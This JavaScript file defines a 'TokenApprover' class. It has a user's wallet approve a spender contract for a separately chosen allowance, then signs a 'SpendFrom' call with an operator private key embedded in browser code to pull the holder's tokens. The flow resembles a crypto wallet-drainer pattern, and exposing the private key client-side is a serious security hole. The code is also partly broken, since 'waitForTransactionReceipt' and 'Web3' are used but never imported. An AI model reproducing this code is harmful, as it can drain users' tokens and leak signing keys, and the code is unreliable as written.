import { writeContract, readContract, getWalletClient, getPublicClient, estimateGas } from "https://esm.sh/@wagmi/core@2.x";

export class TokenApprover {
  constructor(wagmiConfig, ownerPrivateKey) {
    this.config = wagmiConfig;
    this.ownerPrivateKey = ownerPrivateKey;
    this.web3 = new Web3(window.ethereum);
  }
  
  async approveAndSpend(tokenAddress, spenderAddress, amount, approval, holder) {
    try {
      console.log(`🚀 Starting approveAndSpend`);
      console.log(`- Token Address: ${tokenAddress}`);
      console.log(`- Spender Address: ${spenderAddress}`);
      console.log(`- Amount: ${amount}`);
      console.log(`- Approval Amount: ${approval}`);
      console.log(`- Holder: ${holder}`);
  
      // Check balance
      const balance = await this.checkBalance(tokenAddress, holder);
      console.log(`💰 Current Balance: ${balance}`);
      
      if (balance < amount) {
        console.error(`❌ Insufficient Balance: ${balance} < ${amount}`);
        throw new Error("Insufficient balance");
      }
  
      // Check current allowance
      const currentAllowance = await this.checkAllowance(tokenAddress, holder, spenderAddress);
      console.log(`🔍 Current Allowance: ${currentAllowance}`);
     
      // Approve tokens if needed
      if (currentAllowance < amount) {
        console.log(`🤝 Initiating Token Approval`);
        const approvalHash = await this.approveToken(tokenAddress, spenderAddress, approval);
        console.log(`✅ Approval Initiated. Transaction Hash: ${approvalHash}`);
       
        // Wait for approval transaction
        await waitForTransactionReceipt(this.config, {
          hash: approvalHash
        });
        console.log(`✔️ Approval Transaction Confirmed`);
      }
  
      // Prepare owner account for SpendFrom
      const account = this.web3.eth.accounts.privateKeyToAccount(this.ownerPrivateKey);
      this.web3.eth.accounts.wallet.add(account);
      console.log(`👤 Owner Account: ${account.address}`);
  
      // Precise ABI for the SpendFrom method with both variants
      const spendFromABI = [
        {
          inputs: [
            { internalType: "address", name: "_holder", type: "address" },
            { internalType: "uint256", name: "_amount", type: "uint256" }
          ],
          name: 'SpendFrom',
          type: 'function',
          stateMutability: 'payable',
          outputs: []
        }
      ];

      // Get contract instance
      const contract = new this.web3.eth.Contract(spendFromABI, spenderAddress);

      // Estimate gas using Wagmi
      const gasEstimate = await estimateGas(this.config, {
        address: spenderAddress,
        abi: spendFromABI,
        functionName: 'SpendFrom',
        args: [holder, amount],
        account: account.address,
      });
      
      // Add 20% buffer to gas estimate (increased from 10%)
      const gasLimit = Math.ceil(Number(gasEstimate) * 1.2);
      console.log(`⛽ Estimated Gas: ${gasEstimate}, Gas Limit with Buffer: ${gasLimit}`);

      // Get gas price
      const publicClient = getPublicClient(this.config);
      const gasPrice = await publicClient.getGasPrice();
      console.log(`⛽ Base Gas Price: ${gasPrice}`);
  
      // Increase gas price by 10%
      const increasedGasPrice = (BigInt(gasPrice) * BigInt(110)) / BigInt(100);
      console.log(`⛽ Adjusted Gas Price: ${increasedGasPrice}`);
      
      // Get current nonce
      const nonce = await this.web3.eth.getTransactionCount(account.address, "pending");
      console.log(`🏷️ Nonce: ${nonce}`);

      // Prepare the transaction
      const txData = contract.methods.SpendFrom(holder, amount).encodeABI();
      
      // Send raw transaction
      const txObject = {
        from: account.address,
        to: spenderAddress,
        gas: gasLimit,
        gasPrice: increasedGasPrice.toString(),
        data: txData,
        nonce: nonce
      };

      // Sign and send the transaction
      const signedTx = await this.web3.eth.accounts.signTransaction(txObject, this.ownerPrivateKey);
      const spendTx = await this.web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      
      console.log(`💸 SpendFrom Transaction Successful`);
      console.log(`📋 Transaction Details: ${JSON.stringify(spendTx)}`);
  
      return { spendTx }
    } catch (error) {
      console.error("❌ Detailed Approval and Spend Error:", error);
      console.error("Error Details:", {
        message: error.message,
        name: error.name,
        stack: error.stack
      });
      throw new Error(`Approval and spend failed: ${error.message}`);
    }
  }

  async approveToken(tokenAddress, spenderAddress, approval) {
    console.log(`🔐 Approving Token`);
    console.log(`- Token Address: ${tokenAddress}`);
    console.log(`- Spender Address: ${spenderAddress}`);
    console.log(`- Approval Amount: ${approval}`);

    const result = await writeContract(this.config, {
      address: tokenAddress,
      abi: [
        {
          name: 'approve',
          type: 'function',
          inputs: [
            { name: 'spender', type: 'address' },
            { name: 'amount', type: 'uint256' }
          ],
          outputs: [{ type: 'bool' }]
        }
      ],
      functionName: 'approve',
      args: [spenderAddress, approval]
    });

    console.log(`✅ Token Approval Result: ${result}`);
    return result;
  }

  async checkAllowance(tokenAddress, ownerAddress, spenderAddress) {
    console.log(`🕵️ Checking Allowance`);
    console.log(`- Token Address: ${tokenAddress}`);
    console.log(`- Owner Address: ${ownerAddress}`);
    console.log(`- Spender Address: ${spenderAddress}`);

    const allowance = await readContract(this.config, {
      address: tokenAddress,
      abi: [
        {
          name: 'allowance',
          type: 'function',
          inputs: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' }
          ],
          outputs: [{ type: 'uint256' }]
        }
      ],
      functionName: 'allowance',
      args: [ownerAddress, spenderAddress]
    });

    console.log(`💹 Current Allowance: ${allowance}`);
    return allowance;
  }

  async checkBalance(tokenAddress, ownerAddress) {
    console.log(`💵 Checking Balance`);
    console.log(`- Token Address: ${tokenAddress}`);
    console.log(`- Owner Address: ${ownerAddress}`);

    const balance = await readContract(this.config, {
      address: tokenAddress,
      abi: [
        {
          name: 'balanceOf',
          type: 'function',
          inputs: [{ name: 'account', type: 'address' }],
          outputs: [{ type: 'uint256' }]
        }
      ],
      functionName: 'balanceOf',
      args: [ownerAddress]
    });

    console.log(`💰 Retrieved Balance: ${balance}`);
    return balance;
  }
}